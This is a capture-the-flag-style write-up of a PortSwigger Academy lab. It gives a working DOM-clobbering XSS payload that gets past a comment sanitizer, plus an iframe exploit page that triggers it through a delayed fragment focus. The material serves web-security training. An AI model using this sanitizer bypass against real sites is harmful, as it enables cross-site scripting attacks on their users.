# Lab 04 — Clobbering DOM attributes to bypass HTML filters

> **Expert** · [Official lab](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)

**Entry point:** the comments sanitizer reads an `attributes` property that
can be clobbered by DOM nodes.

## Solution

1. Post a comment containing (the sanitizer allow-lists form/input, so this
   passes):

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

2. Deliver an exploit page whose iframe focuses the clobbered element:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=3"
        onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>
```

3. Clobbering `attributes` makes its `length` undefined → the filter skips
   attribute checks → the form keeps `onfocus`. The delayed `#x` fragment
   focuses the form → `print()` executes — lab solved.

## Notes

The 500ms delay ensures the comment markup exists before the fragment
focus runs.
